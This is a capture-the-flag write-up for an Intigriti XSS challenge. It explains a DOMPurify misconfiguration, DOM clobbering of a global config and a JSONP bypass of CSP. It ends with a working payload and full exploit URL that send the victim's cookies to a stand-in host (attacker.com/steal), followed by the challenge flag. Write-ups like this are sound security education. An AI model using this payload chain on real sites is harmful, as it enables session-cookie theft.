# Intigriti March 2026 XSS Challenge Writeup

## TL;DR
Chain three bugs together: **DOM Clobbering** hijacks `window.authConfig`,
a **DOMPurify misconfiguration** lets the clobber survive sanitization,
and a **JSONP endpoint** bypasses CSP to trigger cookie exfiltration.

---

## The Application

A search portal that reflects the `q` URL parameter through DOMPurify
and injects it into the DOM via `innerHTML`. Protected by `script-src 'self'` CSP.

---

## The Vulnerabilities

### 1. DOMPurify Misconfiguration
```js
DOMPurify.sanitize(q, {
    FORBID_ATTR: ['id', 'class', 'style'], // missing: name, data-*
    KEEP_CONTENT: true
});
```

Two problems:
- `name` attribute is not forbidden → enables DOM Clobbering
- `ALLOW_DATA_ATTR` defaults to `true` → `data-*` attributes survive

---

### 2. DOM Clobbering `window.authConfig`

`Auth.loginRedirect` reads from the global `window.authConfig`:
```js
let config = window.authConfig || { dataset: { next: '/', append: 'false' }};
let redirectUrl = config.dataset.next;
if (config.dataset.append === 'true') {
    redirectUrl += "?token=" + encodeURIComponent(document.cookie);
}
window.location.href = redirectUrl;
```

Named `<form>` elements are exposed on `window` by the browser.
HTML `.dataset` maps to `data-*` attributes. So injecting:
```html
<form name="authConfig" data-next="https://attacker.com" data-append="true">
```

Makes the function read:
- `config.dataset.next`   → `"https://attacker.com"`
- `config.dataset.append` → `"true"`

No JavaScript needed. Pure DOM Clobbering.

---

### 3. JSONP Endpoint Bypasses CSP

`ComponentManager` builds a script URL from attacker-controlled `data-config`:
```js
let scriptUrl = config.path + config.type + '.js';
document.head.appendChild(script); // CSP blocks external origins
```

The app exposes a JSONP endpoint at `/api/stats?callback=Auth.loginRedirect`
which responds with same-origin JavaScript:
```js
Auth.loginRedirect({"visits":42})
```

The `.js` suffix requirement is defeated with a URL fragment:
```
/api/stats?callback=Auth.loginRedirect#
```

The `#` makes `.js` a fragment — server ignores it, CSP allows it.

---

## The Payload
```html
<form name="authConfig" data-next="https://attacker.com/steal" data-append="true"></form>
<div data-component="true" data-config='{"path":"/api/stats?callback=Auth.loginRedirect#","type":""}'></div>
```

Full URL:
```
https://challenge-0326.intigriti.io/challenge.html?q=<form name="authConfig" data-next="https://attacker.com/steal" data-append="true"></form><div data-component="true" data-config='{"path":"/api/stats?callback=Auth.loginRedirect#","type":""}'></div>
```
---

**Flag:** `INTIGRITI{019cdb71-fcd4-77cc-b15f-d8a3b6d63947}`